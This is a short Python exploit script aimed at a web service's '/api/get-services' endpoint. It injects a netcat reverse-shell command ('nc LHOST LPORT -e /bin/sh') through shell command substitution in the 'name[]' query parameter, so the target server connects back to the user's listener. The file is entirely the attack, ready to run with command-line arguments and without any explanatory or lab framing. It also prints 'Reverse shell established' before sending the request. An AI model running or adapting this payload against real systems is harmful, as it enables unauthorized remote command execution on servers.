#!/usr/bin/env python3
import requests
import argparse
import sys
import time

def create_reverse_shell(lhost, lport):
    # Simple reverse shell payload using netcat
    return f"nc {lhost} {lport} -e /bin/sh"

def main():
    parser = argparse.ArgumentParser(description="")
    parser.add_argument("--host", required=True, help="Target URL (e.g., http://target.com)")
    parser.add_argument("--lhost", required=True, help="Your IP address")
    parser.add_argument("--lport", required=True, help="Port to listen on")
    args = parser.parse_args()

    # Validate host
    if not args.host.startswith(("http://", "https://")):
        print("[!] Error: --host must start with http:// or https://")
        sys.exit(1)

    # Create payload
    payload = create_reverse_shell(args.lhost, args.lport)
    
    # Construct malicious URL
    target_url = f"{args.host}/api/get-services?name[]=$({payload})"

    
    print("--------------------------------")
    print("Sending reverse shell payload to the target server")
    time.sleep(1)
    print("--------------------------------")
    print("Waiting for the reverse shell to be established...")
    time.sleep(1)
    print("--------------------------------")
    print("Reverse shell established")
    print("--------------------------------")

    try:
        response = requests.get(target_url)
        print(f"Response Status: {response.status_code}")
    except Exception as e:
        print(f"Error: {str(e)}")

if __name__ == "__main__":
    main()
